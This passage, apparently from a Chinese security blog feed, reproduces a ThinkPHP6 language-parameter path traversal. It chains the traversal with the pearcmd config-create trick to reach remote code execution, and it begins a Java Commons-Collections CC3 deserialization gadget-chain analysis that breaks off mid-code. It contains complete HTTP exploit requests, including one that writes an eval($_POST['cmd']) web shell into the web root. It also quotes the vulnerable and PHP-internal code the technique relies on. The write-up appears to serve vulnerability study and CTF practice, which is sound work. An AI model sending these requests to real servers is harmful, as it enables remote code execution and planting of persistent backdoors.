variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">range</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token punctuation">[</span><span class="token variable">$range</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token punctuation">[</span><span class="token variable">$range</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">)</span> <span class="token variable">$file</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$lang</span>   <span class="token operator">=</span> <span class="token function">array_change_key_case</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$lang</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token punctuation">[</span><span class="token variable">$range</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$lang</span> <span class="token operator">+</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token punctuation">[</span><span class="token variable">$range</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lang</span><span class="token punctuation">[</span><span class="token variable">$range</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进<code>parse()</code>，可以看到进行了文件包含：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parse</span><span class="token punctuation">(</span>string <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token punctuation">{</span>    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'php'</span><span class="token punctuation">:</span>            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'yml'</span><span class="token punctuation">:</span>        <span class="token keyword">case</span> <span class="token string">'yaml'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'yaml_parse_file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">yaml_parse_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'json'</span><span class="token punctuation">:</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">json_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">JSON_ERROR_NONE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$result</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>既然可以通过目录穿越实现任意<code>php</code>文件的包含，那么用<code>pearcmd</code>文件包含这个<code>trick</code>，就能<code>RCE</code>了。</p><p>以<code>Docker</code>环境搭建的<code>Thinkphp6</code>为例</p><p>发包</p><pre class=" language-http"><code class="language-http">GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?=phpinfo()?>+/tmp/1.php HTTP/1.1<span class="token header-name keyword">Host:</span> 192.168.36.128<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> think_lang=zh-cn<span class="token header-name keyword">Connection:</span> close</code></pre><p>文件包含</p><pre class=" language-http"><code class="language-http">GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1<span class="token header-name keyword">Host:</span> 192.168.36.128<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> think_lang=zh-cn<span class="token header-name keyword">Connection:</span> close</code></pre><p>当然也可以写入一句话木马get shell</p><pre class=" language-http"><code class="language-http">GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1<span class="token header-name keyword">Host:</span> 192.168.36.128<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9<span class="token header-name keyword">Cookie:</span> think_lang=zh-cn<span class="token header-name keyword">Connection:</span> close</code></pre><h2 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h2><p>pearcmd 文件包含这个 trick ，可以参考 p 牛的文章：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p><p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p><p>原本<code>pear/pcel</code>是一个命令行工具，并不在<code>Web</code>目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到<code>pear</code>中的文件，进而利用其中的特性来搞事。</p><p>在阅读<code>phpinfo()</code>的过程中，发现<code>Docker</code>环境下的<code>PHP</code>会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER['argv']</code>几个变量。</p><p>如果<code>PHP</code>以命令行的形式运行（即<code>sapi</code>是<code>cli</code>），这里很好理解。但如果<code>PHP</code>以<code>Server</code>的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p><p>我们在PHP源码中可以看到这样的逻辑：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">static</span> zend_bool <span class="token function">php_auto_globals_create_server</span><span class="token punctuation">(</span>zend_string <span class="token operator">*</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>variables_order<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strchr</span><span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>variables_order<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strchr</span><span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>variables_order<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">php_register_server_variables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>register_argc_argv<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SG</span><span class="token punctuation">(</span>request_info<span class="token punctuation">)</span><span class="token punctuation">.</span>argc<span class="token punctuation">)</span> <span class="token punctuation">{</span>                zval <span class="token operator">*</span>argc<span class="token punctuation">,</span> <span class="token operator">*</span>argv<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>argc <span class="token operator">=</span> <span class="token function">zend_hash_find_ex_ind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">EG</span><span class="token punctuation">(</span>symbol_table<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ZSTR_KNOWN</span><span class="token punctuation">(</span><span class="token constant">ZEND_STR_ARGC</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token operator">&amp;&amp;</span>                    <span class="token punctuation">(</span>argv <span class="token operator">=</span> <span class="token function">zend_hash_find_ex_ind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">EG</span><span class="token punctuation">(</span>symbol_table<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ZSTR_KNOWN</span><span class="token punctuation">(</span><span class="token constant">ZEND_STR_ARGV</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">Z_ADDREF_P</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">zend_hash_update</span><span class="token punctuation">(</span><span class="token function">Z_ARRVAL</span><span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ZSTR_KNOWN</span><span class="token punctuation">(</span><span class="token constant">ZEND_STR_ARGV</span><span class="token punctuation">)</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">zend_hash_update</span><span class="token punctuation">(</span><span class="token function">Z_ARRVAL</span><span class="token punctuation">(</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">ZSTR_KNOWN</span><span class="token punctuation">(</span><span class="token constant">ZEND_STR_ARGC</span><span class="token punctuation">)</span><span class="token punctuation">,</span> argc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token function">php_build_argv</span><span class="token punctuation">(</span><span class="token function">SG</span><span class="token punctuation">(</span>request_info<span class="token punctuation">)</span><span class="token punctuation">.</span>query_string<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">zval_ptr_dtor_nogc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">array_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>第一个<code>if</code>语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个<code>if</code>语句判断是否开启<code>register_argc_argv</code>，第三个if语句判断是否有<code>request_info.argc</code>存在，如果不存在，其执行的是这条语句：</p><pre class=" language-php"><code class="language-php"><span class="token function">php_build_argv</span><span class="token punctuation">(</span><span class="token function">SG</span><span class="token punctuation">(</span>request_info<span class="token punctuation">)</span><span class="token punctuation">.</span>query_string<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token function">PG</span><span class="token punctuation">(</span>http_globals<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token constant">TRACK_VARS_SERVER</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>无论<code>php_build_argv</code>函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码意味着，<code>HTTP</code>数据包中的<code>query-string</code>会被作为<code>argv</code>的值。</p><p><code>RFC3875</code>中规定，如果<code>query-string</code>中不包含没有编码的<code>=</code>，且请求是<code>GET</code>或<code>HEAD</code>，则<code>query-string</code>需要被作为命令行参数。</p><p><code>PHP</code>现在仍然没有严格按照<code>RFC</code>来处理，即使我们传入的<code>query-string</code>包含等号，也仍会被赋值给<code>$_SERVER['argv']</code>。</p><p>我们再来看到<code>pear</code>中获取命令行<code>argv</code>的函数：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">readPHPArgv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$argv</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'HTTP_SERVER_VARS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Could not read cmd args (register_argc_argv=Off?)"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant">PEAR</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">raiseError</span><span class="token punctuation">(</span><span class="token string">"Console_Getopt: "</span> <span class="token punctuation">.</span> <span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'HTTP_SERVER_VARS'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$argv</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER['argv']</code>，后者我们可通过<code>query-string</code>控制。也就是说，我们通过<code>Web</code>访问了<code>pear</code>命令行的功能，且能够控制命令行的参数。</p><p>看看<code>pear</code>中有哪些可以利用的参数：</p><p>第一眼就看到<code>config-create</code>，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><p>所以，我构造出最后的利用数据包如下：</p><pre class=" language-HTTP"><code class="language-HTTP">GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1Host: 192.168.1.162:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close</code></pre><p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;;</code></p><p>然后，我们再利用文件包含漏洞包含这个文件即可<code>getshell</code>：</p><p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是<code>Docker</code>启动的<code>PHP</code>环境即可通过上述一个数据包搞定。</p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复:<a href="https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099">https://github.com/top-think/framework/commit/c4acb8b4001b98a0078eda25840d33e295a7f099</a></p><p>大致就是加入了一个正则判断，只允许字母数字以及<code>-</code>。看到这个修复，我第一时间想到了利用回溯次数绕过<code>preg_match</code>，不过，我在本地尝试时，总是会报错<code>Invalid Request</code>。单独拿出来进行测试，发现可以绕过<code>preg_match</code>，但后续是将<code>$matches[1]</code>赋值给<code>$langSet</code>。暂时还没有绕过的思路。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaCC3-CC7链分析</title>
      <link href="/2023/02/14/JavaCC3-CC7%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/02/14/JavaCC3-CC7%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaCC3-CC7链分析"><a href="#JavaCC3-CC7链分析" class="headerlink" title="JavaCC3-CC7链分析"></a>JavaCC3-CC7链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上次看java还要追溯到上一次，好久没有看过java了，赶紧先把基础恶补一下。</p><h2 id="CC3链"><a href="#CC3链" class="headerlink" title="CC3链"></a>CC3链</h2><p>CommonsCollections3的目的很明显，就是为了绕过⼀些规则对InvokerTransformer的限制。</p><h3 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3><pre class=" language-java"><code class="language-java">    Gadget chain<span class="token operator">:</span>        ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Map</span><span class="token punctuation">(</span>Proxy<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                        LazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                            ChainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                ConstantTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                    InstantiateTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                        <span class="token keyword">new</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span>                                            templatesImpl<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="版本环境"><a href="#版本环境" class="headerlink" title="版本环境"></a>版本环境</h3><p>dk&lt;JDK8u71，commons-collections3.1-3.2.1</p><pre class=" language-1"><code class="language-1"><dependency>    <groupId>commons-collections</groupId>    <artifactId>commons-collections</artifactId>    <version>3.1</version></dependency></code></pre><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>在<code>TrAXFilter</code>中有<code>_transformer = (TransformerImpl) templates.newTransformer();</code>利用此处的<code>newTransformer()</code>可以绕过<code>InvokerTransformer</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">TrAXFilter</span><span class="token punctuation">(</span>Templates templates<span class="token punctuation">)</span>  <span class="token keyword">throws</span>        TransformerConfigurationException    <span class="token punctuation">{</span>        _templates <span class="token operator">=</span> templates<span class="token punctuation">;</span>        _transformer <span class="token operator">=</span> <span class="token punctuation">(</span>TransformerImpl<span class="token punctuation">)</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _transformerHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerHandlerImpl</span><span class="token punctuation">(</span>_transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        _useServicesMechanism <span class="token operator">=</span> _transformer<span class="token punctuation">.</span><span class="token function">useServicesMechnism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>该类中的<code>transform</code>方法可以调用任意类的构造器方法。于是乎就把链连起来了。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token function">InstantiateTransformer</span><span class="token punctuation">(</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>input <span class="token keyword">instanceof</span> <span class="token class-name">Class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null object"</span> <span class="token operator">:</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            Constructor con <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Class<span class="token punctuation">)</span>input<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InstantiateTransformer: The constructor must exist and be public "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InstantiationException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token string">"InstantiateTransformer: InstantiationException"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span><span class="token 